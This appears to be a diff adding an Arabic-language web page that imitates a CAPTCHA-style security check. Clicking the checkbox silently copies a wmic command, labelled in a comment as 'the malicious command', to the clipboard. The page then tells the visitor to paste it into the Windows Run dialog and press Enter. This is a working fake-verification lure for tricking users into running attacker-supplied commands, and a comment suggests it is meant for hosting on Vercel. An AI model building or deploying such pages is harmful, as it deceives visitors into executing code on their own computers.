@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق من الأمان</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .cf-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 350px; }
+        .cf-header { font-size: 20px; font-weight: bold; color: #333; margin-bottom: 10px; }
+        .cf-sub { font-size: 14px; color: #666; margin-bottom: 30px; }
+        .checkbox-wrapper { display: flex; align-items: center; justify-content: center; border: 1px solid #ccc; padding: 15px; border-radius: 4px; cursor: pointer; transition: 0.3s; }
+        .checkbox-wrapper:hover { background-color: #f9f9f9; }
+        .cb { width: 20px; height: 20px; border: 2px solid #999; border-radius: 3px; margin-left: 10px; display: flex; justify-content: center; align-items: center; }
+        .tick { display: none; color: #28a745; font-weight: bold; }
+        .inst { display: none; margin-top: 20px; font-size: 14px; color: #d9534f; font-weight: bold; line-height: 1.6; }
+        code { background: #eee; padding: 2px 5px; border-radius: 3px; color: #333; }
+    </style>
+</head>
+<body>
+    <div class="cf-box">
+        <div class="cf-header">التحقق من الأمان</div>
+        <div class="cf-sub">الرجاء تأكيد أنك لست روبوتاً للمتابعة</div>
+        
+        <div class="checkbox-wrapper" onclick="triggerHack()">
+            <span>لست روبوتاً</span>
+            <div class="cb" id="box"><span class="tick" id="tick">✔️</span></div>
+        </div>
+
+        <div class="inst" id="inst">
+            للتحقق، يرجى فتح نافذة التشغيل <code>Win + R</code> <br>
+            ثم لصق الأمر <code>Ctrl + V</code> والضغط على <code>Enter</code>
+        </div>
+    </div>
+
+    <script>
+        function triggerHack() {
+            // تغيير شكل المربع
+            document.getElementById('tick').style.display = 'block';
+            document.getElementById('box').style.borderColor = '#28a745';
+            document.getElementById('inst').style.display = 'block';
+
+            // الأمر الخبيث (سيستخدم wmic لبدء خدمات ويندوز عن بُعد)
+            const payload = 'wmic service where "name=\'wmi\'" call start';
+
+            // كود النسخ التلقائي (سيعمل بنجاح لأن Vercel يوفر HTTPS)
+            navigator.clipboard.writeText(payload).then(() => {
+                console.log('تم نسخ الأمر بنجاح!');
+            }).catch(err => {
+                console.error('فشل النسخ: ', err);
+            });
+        }
+    </script>
+</body>
+</html>
